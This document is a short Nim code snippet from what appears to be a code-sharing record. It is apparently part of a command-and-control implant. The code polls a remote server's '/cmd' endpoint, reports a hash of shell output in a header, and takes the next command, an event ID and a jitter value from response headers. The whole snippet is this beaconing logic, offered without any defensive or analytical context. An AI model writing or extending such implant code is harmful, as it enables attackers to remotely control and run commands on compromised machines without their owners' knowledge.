---
id: f9bc5959-9f4a-4732-9592-4e7715f46953
type: code
language: ''
verified: false
created_at: '2023-06-06T03:07:45.871933+00:00'
updated_at: '2023-06-06T03:09:03.666410+00:00'
---

# Code Snippet f9bc5959

```
var GetCommand = newHttpClient(userAgent= defUserAgent)
GetCommand.headers = newHttpHeaders({ "Content-MD5": Outp_shell_md5_string })
let sent = GetCommand.request(server & "/cmd", httpMethod = HttpGet)
#echo sent.status
let response = sent.headers
let cmd = response.getOrDefault("X-cmd") # Check for Command
let event_id = response.getOrDefault("x-event-id") # Check for event ID
let jitter = response.getOrDefault("x-jitter")
```
